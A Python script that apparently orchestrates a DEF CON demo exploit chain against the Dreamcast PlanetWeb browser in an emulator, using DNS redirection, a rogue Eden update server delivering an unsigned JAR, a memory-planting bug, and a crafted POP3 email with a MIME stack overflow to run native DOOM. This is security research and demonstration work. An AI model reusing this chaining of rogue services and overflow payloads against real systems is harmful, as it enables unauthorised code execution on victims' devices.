#!/usr/bin/env python3
"""
dreamcast_doom_native.py -- one-command DEF CON demo:
    Dreamcast PlanetWeb browser  ->  Eden RCE plants a stub (setRawDeviceID)
                                 ->  email MIME overflow jumps to it  ->  native SH-4 DOOM.

    sudo python3 dreamcast_doom_native.py

The **fully on-device** DOOM chain -- NO GDB, no debugger, no host staging. Every byte is
delivered by content we serve (a rogue Eden server + a rogue POP3 server) and by the console's
own bugs. Three real bugs, chained:

  Bug #1  Eden service-subscription RCE  -> the browser goes online, phones home to
          eden.planetweb.com (us), and runs our unsigned JAR (StageDoom) with no
          SecurityManager. That Java is the ONLY way to reach the next bug.
  Bug #3  setRawDeviceID (native cmd 100) -> StageDoom's Java does an unbounded memcpy to
          the FIXED address 0x8C29ABE6, planting a tiny native loader stub at 0x8C29ADE8.
          It also HTTP-streams doom.bin + WAD into a JVM-heap byte[] tagged "DOOMSTG1".
  Bug #2  MIME name= stack overflow -> opening our DOOM-STAGE email overwrites the saved
          return address with 0x8C29ADE8 and returns straight into the planted stub, which
          scans the heap for the magic, relocates the engine + WAD, and jumps -> DOOM.

Why this instead of the GDB demo (dreamcast_doom.py)? No debugger anywhere -- nothing halts
the guest, nothing to hand-wave. The tradeoff: the ~3.8 MB payload lives in the JVM heap
between staging and email-open, so open the message promptly once the chain arms (below).

Leaves dreamcast_doom.py (the proven GDB demo) completely untouched -- run either one.

Requires root (binds :53, :80, :110). Prereqs already built: build/pwn_stagedoom.jar,
build/doom.bin, build/stub_native.bin, wad/doom1_trim.wad.
"""

import os, sys, time, socket, struct, subprocess, threading, signal, re

ROOT     = os.path.dirname(os.path.abspath(__file__))
# A SEPARATE Flycast used ONLY by this no-GDB demo, so the GDB demo + calc demo keep running the
# stock build/Flycast.app untouched. Rebuild it with mac/build_flycast.sh, then copy the signed app
# to emu/flycast-native/. The previously described picoppp reap patch is not in mac/patches/.
FLYCAST  = os.path.join(ROOT, "emu/flycast-native/Flycast.app/Contents/MacOS/Flycast")
FCHOME   = os.path.join(ROOT, "emu/fchome")
FCLOG    = os.path.join(FCHOME, ".flycast/data/flycast.log")
FCDATA   = os.path.join(FCHOME, ".flycast/data")
# pristine, already-configured flash+VMU shared by all demos, restored before every launch so
# no state (Eden subscription, cached page, cookie, last URL, read-mail flags) leaks between runs.
BASELINE = os.path.join(ROOT, "emu", "flash_baseline")
PERSIST  = ("dc_nvmem.bin", "dc_flash.bin", "T31901N_vmu_save_A1.bin", "vmu_save_A2.bin")
DNS_PY   = os.path.join(ROOT, "dns_redirect.py")
EDEN_PY  = os.path.join(ROOT, "eden_mitm.py")
MAIL_PY  = os.path.join(ROOT, "mail_poc.py")

STAGE_JAR = os.path.join(ROOT, "build/pwn_stagedoom.jar")
DOOM_BIN  = os.path.join(ROOT, "build/doom.bin")
# Renderable payload: doom1_trim is the only WAD with TITLEPIC + sprites (the engine I_Errors
# without them, and we can't recompile it -- no SH-4 toolchain). The 3.8MB stream is made
# reliable by StageDoom's 256KB chunks (few picoppp connections), not by shrinking the WAD.
# build_stage_native.py bakes stub_native.bin for THIS wad; eden serves both only for
# --chain stagedoom (GDB demo + its build/stub.bin untouched).
STUB_BIN  = os.path.join(ROOT, "build/stub_native.bin")
WAD_FILE  = os.path.join(ROOT, "wad/doom1_trim.wad")

EDEN_LOG = "/tmp/eden_native.log"
MAIL_LOG = "/tmp/mail_native.log"
DNS_LOG  = "/tmp/demo_dns.log"
EDEN_PORT = 80
POP_PORT  = 110

STUB_ADDR = 0x8C29ADE8           # planted by setRawDeviceID; the email's saved-PR points here
MAIL_PC   = "%08X" % STUB_ADDR    # 4-byte saved-PR overwrite (hex); bytes 8C/29/AD/E8, all copy-safe
MAIL_PAD  = "64"                  # bytes before the saved-PR slot

# NOTE: this demo NEVER starts or connects to a GDB stub. That is the whole point -- the payload
# is delivered by Bug #1 + Bug #3 and triggered by Bug #2, entirely on-device. Flycast is launched
# with the GDB server OFF, so nothing can halt the guest mid-boot.

# the browser disc (override with DISC=/path)
DISC = os.environ.get("DISC",
    os.path.expanduser("~/Downloads/Internet Browser V3.0 for Dreamcast (USA)/"
                       "Internet Browser V3.0 for Dreamcast (USA).gdi"))

FLYCAST_ATTEMPTS = 12

G="\033[92m"; Y="\033[93m"; R="\033[91m"; B="\033[1m"; X="\033[0m"
def say(m):  print("   " + m, flush=True)
def hdr(m):  print("\n" + G + "="*66 + "\n== " + m + "\n" + "="*66 + X, flush=True)
def warn(m): print(R + "!! " + m + X, flush=True, file=sys.stderr)

def fix_tty():
    """Launching Flycast under sudo leaves the controlling TTY in raw mode (onlcr off), so
    every line printed afterward staircases down the screen. Restore cooked mode."""
    try:
        if sys.stdout.isatty():
            subprocess.run(["stty", "sane"], stderr=subprocess.DEVNULL)
    except Exception: pass

procs = []

def _iface_inet(iface):
    """The IPv4 on an interface, however it was assigned (ipconfig getifaddr only reports
    DHCP leases -- a tethered/hotspot/static address like 192.0.0.2 needs the ifconfig fallback)."""
    try:
        a = subprocess.check_output(["ipconfig","getifaddr",iface], text=True).strip()
        if a: return a
    except Exception: pass
    try:
        for l in subprocess.check_output(["ifconfig",iface], text=True).splitlines():
            l=l.strip()
            if l.startswith("inet ") and not l.split()[1].startswith("127."):
                return l.split()[1]
    except Exception: pass
    return ""

def host_ip():
    if os.environ.get("HOST_IP"): return os.environ["HOST_IP"]
    # 1) the default-route interface (works for static/tethered/hotspot/DHCP alike)
    try:
        dev = subprocess.check_output(["route","-n","get","default"], text=True)
        iface = next(l.split()[-1] for l in dev.splitlines() if "interface:" in l)
        a = _iface_inet(iface)
        if a: return a
    except Exception: pass
    # 2) any physical en* address (skip loopback + tailscale/CGNAT 100.x)
    try:
        cur=None
        for l in subprocess.check_output(["ifconfig"], text=True).splitlines():
            if l and not l[0].isspace(): cur=l.split(":")[0]
            s=l.strip()
            if s.startswith("inet ") and cur and cur.startswith("en"):
                ip=s.split()[1]
                if not ip.startswith("127.") and not ip.startswith("100."):
                    return ip
    except Exception: pass
    return "127.0.0.1"

def real_user():
    return os.environ.get("SUDO_USER") or subprocess.check_output(
        ["stat","-f%Su","/dev/console"], text=True).strip()

def kill_stale():
    """Reap leftovers from ANY demo so ports free up and only one runs at a time. We run as
    root; protect our own pid/parent/process-group so we never kill ourselves."""
    me=os.getpid(); parent=os.getppid()
    try: my_pgid=os.getpgid(0)
    except Exception: my_pgid=-1
    protected={me,parent,0}
    def reap(pat,label):
        try: out=subprocess.check_output(["pgrep","-f",pat],text=True).split()
        except subprocess.CalledProcessError: out=[]
        for s in out:
            pid=int(s)
            if pid in protected: continue
            try:
                if os.getpgid(pid)==my_pgid: continue
            except Exception: pass
            try: os.kill(pid, signal.SIGTERM); say("reaped stale %s (pid %d)"%(label,pid))
            except Exception: pass
    for n in ("dns_redirect.py","eden_mitm.py","mail_poc.py","dreamcast_calc.py",
              "dreamcast_doom.py","dreamcast_doom_native.py","doom_demo_1.py"):
        reap(n,n)
    try:
        for s in subprocess.check_output(["pgrep","-x","Flycast"],text=True).split():
            try: os.kill(int(s),signal.SIGTERM); say("reaped stale Flycast (pid %s)"%s)
            except Exception: pass
    except subprocess.CalledProcessError: pass
    time.sleep(2)

def reset_flash():
    """Restore the pristine, pre-configured flash+VMU so this demo starts exactly like every
    other -- no Eden subscription, cached page, cookie, or read-mail flag carried over. The
    baseline keeps the network + email config, so nothing is wiped. Captures on first run;
    RECAPTURE=1 forces a fresh capture from a known-good state."""
    import shutil
    os.makedirs(BASELINE, exist_ok=True)
    present = [f for f in PERSIST if os.path.exists(os.path.join(FCDATA, f))]
    have = present and all(os.path.exists(os.path.join(BASELINE, f)) for f in present)
    if os.environ.get("RECAPTURE") == "1" or not have:
        n = 0
        for f in present:
            shutil.copy2(os.path.join(FCDATA, f), os.path.join(BASELINE, f)); n += 1
        say("captured clean flash/VMU baseline (%d files) -- future runs reset to this" % n)
        return
    n = 0
    for f in present:
        b = os.path.join(BASELINE, f)
        if os.path.exists(b):
            shutil.copy2(b, os.path.join(FCDATA, f)); n += 1
    say("reset to clean browser (%d files) -- no subscription/cache/read-mail from a prior demo" % n)

def cleanup(*_):
    print()
    for _,p in procs:
        if p.poll() is None:
            try: p.terminate()
            except Exception: pass
    subprocess.run(["pkill","-TERM","-x","Flycast"], stderr=subprocess.DEVNULL)
    fix_tty()   # restore cooked mode so the shell isn't left staircasing after we exit
    say("stopped DNS + Eden + POP3 + emulator")
    os._exit(0)

# ---- boot (NO GDB -- a debugger connect/halt pauses the guest mid-boot; we never touch one) ----
def launch_flycast(ip):
    """Cold boot with the GDB server OFF. Retry ONLY the vmem-reservation race, detectable from
    the log ('Verify Failed') with no debugger. Nothing here ever opens or connects to a GDB
    stub -- this whole chain is on-device, so there is no reason to."""
    user=real_user(); os.makedirs(FCDATA, exist_ok=True)
    for f in (os.listdir(FCDATA) if os.path.isdir(FCDATA) else []):
        if f.endswith(".state"):
            try: os.remove(os.path.join(FCDATA,f))
            except Exception: pass
    reset_flash()   # identical clean browser every launch (see reset_flash docstring)
    subprocess.run(["sudo","-u",user,"defaults","write","com.flyinghead.Flycast",
                    "ApplePersistenceIgnoreState","-bool","YES"],
                   stderr=subprocess.DEVNULL, env=dict(os.environ, HOME=FCHOME))
    args=["sudo","-u",user,"env","HOME="+FCHOME, FLYCAST,
          "-config","log:LogToFile=yes",
          "-config","config:Debug.GDBEnabled=no",     # <- GDB server OFF, always
          "-config","network:Enable=yes",
          "-config","network:DCNet=no",
          "-config","network:EmulateBBA=yes",
          "-config","network:DNS="+ip,
          DISC]
    for att in range(1, FLYCAST_ATTEMPTS+1):
        try: open(FCLOG,"w").close()
        except Exception: pass
        p=subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ok=None
        for _ in range(30):
            time.sleep(1)
            try: log=open(FCLOG,errors="ignore").read()
            except Exception: log=""
            if "Verify Failed" in log: ok=False; break      # vmem race -> relaunch
            if "Game ID" in log:       ok=True;  break      # booting -> accept, DON'T probe it
            if p.poll() is not None:   ok=False; break
        if ok:
            time.sleep(2)
            if p.poll() is None:
                fix_tty()   # sudo/Flycast left the TTY raw -- restore before we print anything else
                if att>1: say("(booted on attempt %d)"%att)
                return p
        say("attempt %d: RAM-reservation race, relaunching"%att)
        try: p.terminate()
        except Exception: pass
        subprocess.run(["pkill","-TERM","-x","Flycast"], stderr=subprocess.DEVNULL)
        time.sleep(2)
    warn("Flycast would not start in %d attempts (see %s)"%(FLYCAST_ATTEMPTS,FCLOG)); cleanup()

# ---- watch the on-device chain arm, then tell the operator to fire ----
armed_evt = threading.Event()

def watch_chain():
    """Tail the Eden log. The subscription chain [1]..[5] runs our JAR (StageDoom); StageDoom
    then HTTP-streams the payload ([7] doom.bin) and plants the stub ([7b] stub.bin). Once the
    stub is served the console is ARMED -- the blob is in the JVM heap and the loader stub sits
    at 0x8C29ADE8, waiting for the email's saved-PR overwrite to return into it."""
    # We can't see the console's RAM (no GDB) -- ARMED is INFERRED from StageDoom's own HTTP
    # traffic to our Eden server, which happens in a fixed order:
    #   [5] runs our JAR -> [7] fetch doom.bin/WAD -> POST /heap (blob staged, CONFIRMED) ->
    #   [7b] fetch stub.bin -> setRawDeviceID plants it (NO callback -- invisible to us).
    # The stub fetch is the last thing we see before the plant, so that's the ARMED trigger;
    # the /heap POST first confirms the ~3.8MB blob actually finished staging in the heap.
    steps = [("[1]",              "edenclient.conf — the console asks where to log in"),
             ("[2]",              "POST /login    — we answer as Eden"),
             ("[3]",              "POST /discovery — we offer a 'service'"),
             ("[4]",              "POST /subscribe — we hand back a download URL"),
             ("[5]",              "serving pwn_stagedoom.jar — *** CODE EXEC: the console runs our Java ***"),
             ("serving doom.bin", "StageDoom is streaming doom.bin + WAD into a JVM-heap byte[] (magic DOOMSTG1)"),
             ("staged doom=",     "blob CONFIRMED staged + pinned in the heap (StageDoom POSTed /heap back to us)"),
             ("serving stub.bin", "StageDoom fetched the stub -> planting @0x8C29ADE8 via setRawDeviceID (cmd 100)")]
    seen=set()
    while True:
        try: log=open(EDEN_LOG,errors="ignore").read()
        except Exception: log=""
        for tag,desc in steps:
            if tag in log and tag not in seen:
                seen.add(tag)
                hot = tag in ("[5]","staged doom=","serving stub.bin")
                say((Y+B if hot else "")+desc+X)
        if "serving stub.bin" in log and not armed_evt.is_set():
            armed_evt.set()
            hdr(Y+B+"ARMED -- blob staged in RAM, stub planted @0x8C29ADE8. FIRE THE EMAIL."+X)
            say(B+"Mail -> Check Mail, then OPEN the DOOM-STAGE message."+X)
            say("opening it overflows the MIME name= field, overwrites the saved return address")
            say("with 0x%08X, and returns into the stub -> it finds the heap blob, relocates the"%STUB_ADDR)
            say("engine + WAD, and jumps into native SH-4 DOOM.")
            say(R+"Do it promptly:"+X+" the ~3.8 MB blob lives in the JVM heap; browser activity can")
            say("overwrite it. If DOOM doesn't come up, just re-open the message (or reconnect to")
            say("re-run StageDoom), then open it again.")
        time.sleep(1)

CHUNK_BYTES = 262144   # must match StageDoom's CHUNK (256KB) for the /N estimate

def watch_progress():
    """Live download progress so you can SEE the stream advancing (not stalled). The Eden
    server logs one '[CHUNK] start-end/total' line per range it serves; we tail + summarize.
    StageDoom fetches doom.bin (~418KB) first, then the WAD (~3.4MB), in ~256KB chunks."""
    last = ""
    while not armed_evt.is_set():
        try: log = open(EDEN_LOG, errors="ignore").read()
        except Exception: log = ""
        ch = re.findall(r"\[CHUNK\] (\d+)-(\d+)/(\d+)", log)
        if ch:
            end, tot = int(ch[-1][1]), int(ch[-1][2])
            served = sum(1 for c in ch if int(c[2]) == tot)     # chunks served for the file in flight
            of = max(1, -(-tot // CHUNK_BYTES))                  # ceil: expected chunks for this file
            which = "engine" if tot < 1000000 else "WAD   "
            rep = "%s  chunk %2d/%-2d   %5.2f/%.2f MB  (%3d%%)" % (
                  which, served, of, end/1e6, tot/1e6, 100*end//tot)
            if rep != last:
                say(Y + "  ↓ " + rep + X)
                last = rep
        time.sleep(3)

def watch_mail():
    """Confirm the console actually fetched the DOOM-STAGE message (POP3 RETR/TOP)."""
    told=False
    while True:
        try: log=open(MAIL_LOG,errors="ignore").read()
        except Exception: log=""
        if (("RETR" in log) or ("TOP" in log)) and not told:
            told=True
            say(G+"mail client fetched the DOOM-STAGE message -> overflow fires on open."+X)
        time.sleep(1)

def main():
    if os.geteuid()!=0:
        warn("needs root for :53/:80/:110 -- run:  sudo python3 dreamcast_doom_native.py"); sys.exit(1)
    need = [FLYCAST, DISC, DNS_PY, EDEN_PY, MAIL_PY, STAGE_JAR, DOOM_BIN, STUB_BIN, WAD_FILE]
    for f in need:
        if not os.path.exists(f): warn("missing required file: %s"%f); sys.exit(1)

    # mail_poc prefers a pre-built name_payload.hex over MAIL_PC; make sure that file (if it
    # exists) actually points the email's saved-PR at our planted stub, or the jump misses.
    npf = os.path.join(ROOT, "name_payload.hex")
    if os.path.exists(npf):
        try:
            b = bytes.fromhex(open(npf).read().strip())
            got = int.from_bytes(b[-4:], "little")
            if got != STUB_ADDR:
                warn("name_payload.hex targets 0x%08X, not the stub 0x%08X -- the email would miss."
                     % (got, STUB_ADDR))
                warn("fix name_payload.hex (or delete it so MAIL_PC=%s is used) before demoing." % MAIL_PC)
                sys.exit(1)
        except SystemExit: raise
        except Exception as e:
            warn("could not verify name_payload.hex (%s) -- check the email target by hand." % e)

    signal.signal(signal.SIGINT, cleanup); signal.signal(signal.SIGTERM, cleanup)
    ip=host_ip()

    hdr("DEF CON -- PlanetWeb  ->  Eden RCE plants stub  ->  email overflow  ->  native DOOM  (NO GDB)")
    say("host IP   %s   (guest DNS points here)"%ip)
    say("disc      %s"%os.path.basename(DISC))
    say("payload   pwn_stagedoom.jar -> doom.bin (%d B) + doom1_trim.wad (%d B)"
        %(os.path.getsize(DOOM_BIN), os.path.getsize(WAD_FILE)))
    say("stub      build/stub_native.bin (%d B) -> planted @0x%08X via setRawDeviceID"
        %(os.path.getsize(STUB_BIN), STUB_ADDR))
    say("email     MIME name= overflow: pad %s + saved-PR = 0x%08X"%(MAIL_PAD, STUB_ADDR))
    if ip=="127.0.0.1":
        warn("HOST_IP resolved to loopback -- the guest can't reach that. Set HOST_IP=<lan ip>.")

    kill_stale()

    # Keep the Mac FULLY awake for the whole demo. The staging download is a multi-minute,
    # hands-off wait; if the host screensaves / display-sleeps / idle-sleeps, macOS throttles
    # (App Nap) or suspends Flycast -> the emulated Java download stalls or its TCP drops. The
    # -w <pid> makes caffeinate exit when we do.
    try:
        procs.append(("caffeinate", subprocess.Popen(
            ["caffeinate","-dimsu","-w",str(os.getpid())],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)))
        say("caffeinate: Mac kept awake (no sleep/screensaver) for the whole run")
    except Exception:
        warn("could not start caffeinate -- keep the Mac awake manually (move the mouse) during staging")

    say("[1/4] DNS  : all names -> %s"%ip)
    procs.append(("dns", subprocess.Popen(
        [sys.executable,"-u",DNS_PY, ip, "--all", "--bind="+ip],
        stdout=open(DNS_LOG,"w"), stderr=subprocess.STDOUT)))
    time.sleep(1)

    say("[2/4] Eden : rogue eden.planetweb.com on :%d   chain=stagedoom"%EDEN_PORT)
    procs.append(("eden", subprocess.Popen(
        [sys.executable,"-u",EDEN_PY, "--chain","stagedoom", "-p",str(EDEN_PORT)],
        stdout=open(EDEN_LOG,"w"), stderr=subprocess.STDOUT)))
    time.sleep(2)

    say("[3/4] POP3 : DOOM-STAGE overflow mail on :%d   (saved-PR -> 0x%08X)"%(POP_PORT, STUB_ADDR))
    procs.append(("mail", subprocess.Popen(
        [sys.executable,"-u",MAIL_PY, "--pop", str(POP_PORT)],
        stdout=open(MAIL_LOG,"w"), stderr=subprocess.STDOUT,
        env=dict(os.environ, MAIL_PC=MAIL_PC, MAIL_PAD=MAIL_PAD))))
    time.sleep(1)

    say("[4/4] EMU  : launching the Dreamcast (GDB server OFF)")
    launch_flycast(ip)
    say("emulator up")

    hdr("STEP 1 -- TAKE THE BROWSER ONLINE, THEN WAIT (do NOT open Mail yet)")
    say(B+"A x3 -> Start -> web browser."+X+"  Let it connect, then leave it -- hands off.")
    say("going online triggers Bug #1 on its own: the Eden client contacts us, we hand it our")
    say("JAR, and it runs StageDoom -- which streams DOOM into the heap and plants the stub via")
    say("Bug #3. This is automatic; you do NOT navigate anywhere. Open Mail ONLY when it says")
    say(B+"ARMED"+X+" below -- opening the email before the stub is planted makes the jump miss.")
    say("")

    threading.Thread(target=watch_chain,    daemon=True).start()
    threading.Thread(target=watch_progress, daemon=True).start()
    threading.Thread(target=watch_mail,     daemon=True).start()

    hdr(Y+B+"WATCHING THE CHAIN -- open the email when it says ARMED"+X)
    say("no GDB, no staging over a debugger -- all three bugs run on the console. Ctrl-C stops everything.")
    signal.pause()

if __name__ == "__main__":
    main()
